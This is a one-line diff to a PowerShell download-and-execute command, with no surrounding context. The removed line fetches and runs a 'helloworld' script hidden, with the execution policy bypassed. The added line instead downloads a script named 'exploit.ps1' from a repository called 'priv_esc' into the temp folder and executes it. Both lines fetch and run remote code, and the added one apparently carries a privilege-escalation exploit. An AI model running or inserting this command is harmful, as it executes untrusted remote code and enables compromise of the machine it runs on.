@@ -1,1 +1,1 @@
-powershell -NoP -NonI -W Hidden -Exec Bypass "IEX (New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PoshSec/PoshSecScripts/master/helloworld.ps1',\"$env:temp\bob.ps1\"); Start-Process \"powershell.exe $env:temp\bob.ps1\""
+powershell "IEX (New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/llongtin/priv_esc/master/exploit.ps1',\"$env:temp\bob.ps1\");.\"$env:temp\bob.ps1\""
